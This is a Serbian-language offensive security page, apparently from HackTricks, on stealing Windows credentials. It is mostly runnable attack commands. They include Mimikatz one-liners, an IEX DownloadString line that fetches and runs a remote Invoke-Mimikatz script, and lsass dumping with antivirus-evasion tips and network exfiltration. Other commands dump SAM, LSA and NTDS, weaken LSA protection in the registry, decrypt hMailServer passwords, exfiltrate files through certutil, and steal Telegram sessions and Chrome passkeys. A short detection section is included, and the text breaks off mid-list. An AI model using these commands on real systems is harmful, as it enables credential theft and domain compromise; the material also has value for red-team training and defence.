# Krađa Windows kredencijala

{{#include ../../banners/hacktricks-training.md}}

## Kredencijali Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Pronađite druge stvari koje Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Saznajte više o nekim mogućim merama zaštite akreditiva ovde.**](credentials-protections.md) **Ove mere zaštite mogu sprečiti Mimikatz da izvuče neke akreditive.**

## Akreditivi uz Meterpreter

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam kreirao da biste **tražili lozinke i hash vrednosti** na žrtvi.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Zaobilaženje AV-a

### Procdump + Mimikatz

Pošto je **Procdump kompanije** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitimni Microsoft alat**, Defender ga ne detektuje.\
Ovaj alat možete da koristite za **dump procesa lsass**, **preuzimanje dump-a** i **lokalno izdvajanje** **kredencijala** iz dump-a.

Možete da koristite i [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ovaj proces se obavlja automatski pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** kao **zlonamernu** upotrebu **procdump.exe za dumpovanje lsass.exe**, jer **detektuju** stringove **„procdump.exe“ i „lsass.exe“**. Zato je **prikrivenije** da se kao **argument** prosledi **PID** procesa lsass.exe alatu procdump **umesto** naziva lsass.exe.

### Dumpovanje lsass-a pomoću **comsvcs.dll**

DLL pod nazivom **comsvcs.dll**, koji se nalazi u `C:\Windows\System32`, odgovoran je za **dumpovanje memorije procesa** u slučaju pada sistema. Ovaj DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, koja je namenjena za pokretanje pomoću `rundll32.exe`.\
Prva dva argumenta nisu bitna, ali je treći podeljen na tri komponente. Prva komponenta je ID procesa čiji dump treba napraviti, druga je lokacija dump datoteke, a treća komponenta mora biti reč **full**. Ne postoje druge opcije.\
Nakon što se ove tri komponente obrade, DLL kreira dump datoteku i upisuje u nju memoriju navedenog procesa.\
**comsvcs.dll** se može koristiti za dumpovanje procesa lsass, čime se izbegava potreba za otpremanjem i pokretanjem procdump-a. Ovaj metod je detaljno opisan na adresi [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Za pokretanje se koristi sledeća komanda:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Izdvajanje lsass-a pomoću Task Manager-a**

1. Kliknite desnim tasterom miša na traku zadataka, a zatim kliknite na Task Manager
2. Kliknite na More details
3. Na kartici Processes pronađite proces „Local Security Authority Process“
4. Kliknite desnim tasterom miša na proces „Local Security Authority Process“, a zatim kliknite na „Create dump file“.

### Izdvajanje lsass-a pomoću procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je binarna datoteka koju je potpisao Microsoft i deo je [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.

Već postojeći dump pada celog sistema, ili njegova kompresovana kopija u dostupnoj korisničkoj fascikli, mogu da zadrže materijal sa akreditivima za analizu van mreže. Nazivi datoteka kao što su `MEMORY.DMP` i `MEMORY.7z` samo su tragovi za proveru: utvrdite poreklo i dostupnost i nemojte pretpostavljati da sadrže upotrebljive ili aktuelne akreditive.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumpovanje lsass pomoću PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpovanje zaštićenih procesa koji podržava prikrivanje dumpa memorije i prenos na udaljene radne stanice bez upisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Prikrivanje dump fajlova memorije radi izbegavanja mehanizama Defender detekcije zasnovanih na potpisima
3. Otpremanje dumpa memorije pomoću RAW i SMB metoda otpremanja bez upisivanja na disk (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – LSASS dumpovanje zasnovano na SSP-u bez MiniDumpWriteDump

Ink Dragon isporučuje dumper u tri faze, nazvan **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, pa se EDR hook-ovi na tom API-ju nikada ne aktiviraju:<sup>[[3]](#references)</sup>

1. **Faza 1: loader (`lals.exe`)** – pretražuje `fdp.dll` u potrazi za placeholder-om koji se sastoji od 32 mala slova `d`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva izmenjeni DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Time se **LSASS** primorava da učita zlonamerni DLL kao novi Security Support Provider (SSP).
2. **Faza 2 unutar LSASS-a** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, primenjuje XOR nad svakim bajtom pomoću `0x20` i mapira dekodirani blob u memoriju pre predaje izvršavanja.
3. **Faza 3: dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** razrešene pomoću hash-ovanih naziva API-ja (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Namenski export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje kompresovani LSASS dump u datoteku i zatvara handle kako bi eksfiltracija mogla da se obavi kasnije.

Napomene za operatera:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Faza 1 zamenjuje hard-kodirani placeholder apsolutnom putanjom do `rtu.txt`, pa njihovo razdvajanje prekida lanac.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete sami postaviti kako bi LSASS ponovo učitavao SSP pri svakom pokretanju sistema.
* Datoteke `%TEMP%\*.ddt` su kompresovani dump-ovi. Dekompresujte ih lokalno, pa ih prosledite alatima Mimikatz/Volatility za izvlačenje akreditiva.
* Za pokretanje `lals.exe` potrebna su administratorska prava ili SeTcb prava da bi `AddSecurityPackageA` uspeo; nakon povratka poziva, LSASS neprimetno učitava lažni SSP i izvršava Fazu 2.
* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili izbrišite unos iz registra i ponovo pokrenite LSASS (restartujte sistem), ili ga ostavite radi dugoročne perzistencije.

## CrackMapExec

### Dump SAM hash-eva

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Izbaci NTDS.dit sa ciljnog DC-a

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump istorije lozinki iz NTDS.dit sa ciljnog DC-a

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Prikažite atribut pwdLastSet za svaki nalog u NTDS.dit datoteci

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Krađa SAM & SYSTEM

Ove datoteke bi trebalo da se **nalaze** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićene.

### Iz Registry-ja

Najlakši način da ukradete te datoteke jeste da pribavite njihovu kopiju iz Registry-ja:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Preuzmite** te datoteke na svoju Kali mašinu i **izvucite hash vrednosti** pomoću:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Ovom uslugom možete da kopirate zaštićene datoteke. Potrebno je da budete Administrator.

#### Using vssadmin

Binarna datoteka vssadmin dostupna je samo u verzijama Windows Server-а.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ali isto možete da uradite iz **Powershell**. Ovo je primer **kako da kopirate SAM datoteku** (korišćeni disk je „C:“, a datoteka se čuva u C:\users\Public), ali ovo možete da koristite za kopiranje bilo koje zaštićene datoteke:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Konačno, možete koristiti i [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju datoteka SAM, SYSTEM i ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Akreditivi Active Directory-ja - NTDS.dit**

Datoteka **NTDS.dit** poznata je kao srce **Active Directory-ja** i sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. U njoj se čuvaju **hash vrednosti lozinki** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na putanji **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri primarne tabele:

- **Tabela podataka**: U ovoj tabeli čuvaju se detalji o objektima kao što su korisnici i grupe.
- **Tabela veza**: Beleži odnose, kao što su članstva u grupama.
- **SD tabela**: Ovde se čuvaju **bezbednosni deskriptori** za svaki objekat, čime se obezbeđuju bezbednost i kontrola pristupa sačuvanim objektima.

Istraživanje sloja baze podataka koje je sproveo Christoffer Andersson detaljnije dokumentuje ove tabele i njihovo ponašanje u različitim verzijama.<sup>[[8]](#references)</sup>

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom, a koristi je i _lsass.exe_. Zatim se **deo** datoteke **NTDS.dit** može nalaziti **u memoriji procesa `lsass`** (verovatno možete pronaći najskorije pristupljene podatke zahvaljujući poboljšanju performansi upotrebom **cache-a**).

#### Dešifrovanje hash vrednosti unutar NTDS.dit

Hash vrednost se šifruje tri puta:

1. Dešifrujte ključ za šifrovanje lozinki (**PEK**) pomoću **BOOTKEY** ključa i **RC4** algoritma.
2. Dešifrujte **hash** pomoću **PEK** ključa i **RC4** algoritma.
3. Dešifrujte **hash** pomoću **DES** algoritma.

**PEK** ima **istu vrednost na svakom kontroleru domena**, ali je **šifrovan** unutar datoteke **NTDS.dit** pomoću **BOOTKEY** ključa specifičnog za DC, preuzetog iz **SYSTEM** hive-a tog kontrolera domena. Zato je za izdvajanje akreditiva potrebno i **NTDS.dit** i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kopiranje NTDS.dit pomoću Ntdsutil

Dostupno od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Možete koristiti i trik [**volume shadow copy**](#stealing-sam-and-system) da biste kopirali datoteku **ntds.dit**. Imajte na umu da će vam biti potrebna i kopija datoteke **SYSTEM** (ponovo upotrebite trik [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Izdvajanje hash-eva iz NTDS.dit**

Kada **nabavite** datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate poput _secretsdump.py_ da biste **izdvojili hash-eve**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Možete ih i **automatski izdvojiti** koristeći važeći korisnički nalog administratora domena:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Za **velike NTDS.dit datoteke** preporučuje se izdvajanje pomoću [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit datoteke u SQLite bazu podataka**

NTDS objekti mogu se izdvojiti u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Izdvajaju se ne samo tajne već i čitavi objekti i njihovi atributi, kako bi se naknadno izvukle dodatne informacije kada je sirova NTDS.dit datoteka već pribavljena.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive `SYSTEM` je opcionalan, ali omogućava dešifrovanje tajni (NT i LM hash-eva, dodatnih akreditiva kao što su lozinke u čistom tekstu, Kerberos ili trust ključevi, istorije NT i LM lozinki). Između ostalih informacija, izdvajaju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hash-evima, UAC zastavice, vremenska oznaka poslednje prijave i promene lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstva, pouzdani domeni sa tipom, smerom i atributima trust-a...

## Lazagne

Preuzmite binarnu datoteku [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete je koristiti za izdvajanje akreditiva iz različitih softvera.

```
lazagne.exe all
```

## Drugi alati za izvlačenje akreditiva iz SAM-a i LSASS-a

### Windows credentials Editor (WCE)

Ovaj alat se može koristiti za izvlačenje akreditiva iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvucite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Izdvajanje akreditiva iz SAM datoteke

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite** da biste izvukli lozinke.

## Prikupljanje podataka iz neaktivnih RDP sesija i slabljenje bezbednosnih kontrola

Ink Dragon-ov FinalDraft RAT uključuje `DumpRDPHistory` tasker, čije su tehnike korisne svakom red-teamer-u:<sup>[[3]](#references)</sup>

### Prikupljanje telemetrije u stilu DumpRDPHistory

* **Odredišta odlaznih RDP veza** – obradite svaki korisnički hive na putanji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki potključ čuva naziv servera, `UsernameHint` i vremensku oznaku poslednjeg upisa. Možete da replicirate logiku FinalDraft-a pomoću PowerShell-a:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Dokazi o dolaznim RDP vezama** – pretražite dnevnik `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za ID-ove događaja **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao mašinu:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Kada saznaš koji Domain Admin se redovno povezuje, dump-uj LSASS (pomoću LalsDumper/Mimikatz) dok njegova **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavlja njegov verifier i tokene u LSASS-u, koje zatim možeš ponovo da upotrebiš preko SMB/WinRM da preuzmeš `NTDS.dit` ili postaviš persistence na kontrolerima domena.

### Snižavanja postavki registra koja cilja FinalDraft

Isti implant takođe menja nekoliko ključeva registra da bi olakšao krađu akreditiva:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Podešavanje `DisableRestrictedAdmin=1` primorava na potpunu ponovnu upotrebu kredencijala/tiketa tokom RDP sesije, omogućavajući pivotiranje u stilu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, pa lokalni administratori preko mreže dobijaju neograničene tokene.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC na mreži, dajući napadačima još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, čime pristup memoriji postaje trivijalan za dumpere kao što je LalsDumper.

## hMailServer kredencijali u konfiguraciji (nakon kompromitacije)

Proverite tačne konfiguracione datoteke `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` i `C:\ProgramData\hMailServer\hMailServer.ini`, u skladu sa rasporedom instalacije. Čitljiva, neprazna vrednost `[Security] AdministratorPassword=` predstavlja hash administratorske lozinke za hMailServer; ona nije dokaz da je u pitanju lozinka Windows Administrator naloga. Ako se taj kredencijal povrati, za svaki prelazak na Windows nalog potrebno je nezavisno potvrditi ponovnu upotrebu lozinke i prava za prijavu.

Kod instalacija koje koriste SQL CE bazu podataka, zasebna vrednost `[Database] Password=` u INI datoteci štiti bazu podataka. U starijim instalacijama ova vrednost je šifrovana Blowfish algoritmom sa statičkim ključem `THIS_KEY_IS_NOT_SECRET` i zamenama redosleda bajtova u 4-bajtnim rečima. Upotrebite heksadecimalni niz iz INI datoteke uz ovaj Python isečak:<sup>[[2]](#references)</sup>

Najpre potvrdite da lišće nalog može da čita **i** INI datoteku **i** odgovarajuću SQL CE `.sdf` bazu podataka. Lozinka iz INI datoteke štiti bazu podataka; ona je odvojena od hash-eva lozinki poštanskih naloga koji su u njoj sačuvani. Pregledajte ili nadogradite **kopiju** baze podataka koja je u upotrebi; nikada ne koristite aktivnu datoteku.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Sa nešifrovanom lozinkom kopirajte SQL CE bazu podataka da biste izbegli zaključavanje datoteke, učitajte 32-bitni provajder i izvršite nadogradnju ako je potrebno pre upita za hash vrednosti:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Kolona `accountpassword` koristi hMailServer format heša (hashcat režim `1421`). Probijena lozinka poštanskog sandučeta omogućava pivot ka Windows korisniku samo ako tu lozinku koristi i lokalni/domenski nalog i ako taj nalog ima potrebna prava za udaljenu prijavu.

## Presretanje LSA povratnog poziva za prijavu (LsaApLogonUserEx2)

Neki alati hvataju **lozinke za prijavu u otvorenom tekstu** tako što presreću LSA povratni poziv za prijavu `LsaApLogonUserEx2`. Ideja je da se zakači ili obmota povratni poziv paketa za autentifikaciju kako bi se uhvatili akreditivi **tokom prijave** (pre heširanja), a zatim zapisali na disk ili vratili operatoru. Ovo se obično implementira kao pomoćni program koji se ubacuje u LSA ili se registruje kod njega, a zatim beleži svaki uspešan događaj interaktivne/mrežne prijave, zajedno sa korisničkim imenom, domenom i lozinkom.<sup>[[1]](#references)</sup>

Operativne napomene:
- Potrebna su lokalna administratorska/SYSTEM prava za učitavanje pomoćnog programa u putanju za autentifikaciju.
- Uhvaćeni akreditivi se pojavljuju samo kada dođe do prijave (interaktivne, RDP, servisne ili mrežne, u zavisnosti od hook-a).

## Sačuvani akreditivi za povezivanje u SSMS-u (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva sačuvane informacije o povezivanju u datoteci `sqlstudio.bin` za svakog korisnika. Namenski alati za izvlačenje mogu da parsiraju datoteku i povrate sačuvane SQL akreditive. U shell-ovima koji vraćaju samo izlaz komandi, datoteka se često eksfiltrira tako što se kodira kao Base64 i ispisuje na stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Na strani operatera, ponovo napravite datoteku i lokalno pokrenite dumper da biste povratili akreditive:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Krađa Telegram Desktop `tdata` sesije

Telegram Desktop čuva podatke o autorizaciji i stanju naloga u svom direktorijumu **`tdata`**. Kopirana sesija može da se učita pomoću kompatibilnih alata radi autentifikacije bez lozinke naloga, dokle god ta autorizacija važi; ako je omogućeno šifrovanje lokalnih podataka, stealer-u je potrebna i šifra. Autentifikovana sesija zatim može da otkrije podatke o identitetu, metapodatke o razgovorima i članstvu, poruke i medijski sadržaj koji se može preuzeti.<sup>[[10]](#references)</sup>

### Pronalaženje i pribavljanje

Pretražite instalirane i prenosive rasporede; nazivi paketa u Microsoft Store-u se razlikuju, zato izlistajte direktorijume paketa koji sadrže `TelegramMessenge` i pregledajte njihovo podstablo `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ako uobičajeno čitanje ne uspe, a token procesa **već sadrži i omogućava** `SeBackupPrivilege`, pristup koji podržava pravljenje rezervnih kopija pruža alternativu; on ne pribavlja privilegiju niti podiže nivo privilegija procesa. `CreateFileW` sa `FILE_FLAG_BACKUP_SEMANTICS` može da zatraži semantiku pravljenja rezervnih kopija/oporavka i zaobiđe bezbednosne provere datoteka kada su potrebne privilegije tokena prisutne, ali sama zastavica ne zaobilazi nekompatibilnu blokadu deljenja.<sup>[[10]](#references)[[11]](#references)</sup>

Za datoteke koje su trenutno zaključane napravite/pročitajte **Volume Shadow Copy**; za datoteke blokirane ACL-om, `robocopy /B` koristi režim pravljenja rezervnih kopija i zaobilazi ACL-ove datoteka i direktorijuma.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant koji vodi računa o propusnom opsegu može prvo da pošalje samo popis putanja do fajlova, primi identifikator snimka stanja zajedno s putanjama koje su već sačuvane na C2-u, a zatim otpremi samo nedostajuće fajlove. Zato i mali inkrementalni prenosi nakon rekurzivnog popisivanja `tdata` i dalje mogu da ukazuju na uspešnu krađu sesije.<sup>[[10]](#references)</sup>

### Otkrivanje i ograničavanje posledica

Korelirajte rekurzivni pristup direktorijumu `tdata` od strane procesa koji nije Telegram sa omogućavanjem `SeBackupPrivilege`, otvaranjem fajlova sa semantikom pravljenja rezervnih kopija, VSS aktivnošću ili podređenim procesom `robocopy.exe` koji koristi `/B`. Takođe tražite brzo popisivanje direktorijuma `%APPDATA%` i `%LOCALAPPDATA%\Packages`, nakon čega slede odlazne veze iz istog procesa. Nakon kompromitovanja, koristite **Podešavanja → Uređaji** (ili **Privatnost i bezbednost → Aktivne sesije**) da biste prekinuli neprepoznate sesije; samo uključivanje verifikacije u dva koraka ne opoziva autorizaciju koja je već ukradena.<sup>[[10]](#references)[[13]](#references)</sup>

## Krađa passkeys / WebAuthn akreditiva iz Chrome-a na Windows-u

Ako se izvršavanje koda ostvari kao **korisnik-žrtva** na Windows hostu koji koristi **Chrome + sinhronizovane passkeys u Google Password Manager-u**, passkeys postaju zanimljiva meta za post-exploitation čak i **bez admin/SYSTEM privilegija**.<sup>[[4]](#references)</sup>

### Zanimljivi lokalni artefakti

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** čuva protobuf-enkodirane zapise **`WebauthnCredentialSpecifics`**. Proces istog korisnika može da izlista **RP ID**, **username**, **credential ID** i šifrovani materijal privatnog ključa za sinhronizovane passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** čuva lokalno stanje upisa uređaja, kao što su **`wrapped_identity_private_key`** i umotana tajna koja se koristi za oporavak sinhronizovanih kredencijala.<sup>[[4]](#references)</sup>

Brza procena:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blobs i dalje se mogu zloupotrebiti kao lokalni oracle za potpisivanje

Ako pregledač izveze identitetski ključ zaštićen TPM-om kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malveru **nije** potrebno da izvuče sirovi privatni ključ. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke koje kontroliše napadač:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

This znači da **hardversko vezivanje sprečava izvoz van uređaja, ali ne i korišćenje od strane istog korisnika na kompromitovanom krajnjem uređaju**.

### Praktični putevi zloupotrebe

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Nabrojati `WebauthnCredentialSpecifics` zapise iz Chrome-ovog LevelDB-a.
   - Započeti prijavu pomoću passkey-ja i pribaviti svež WebAuthn izazov.
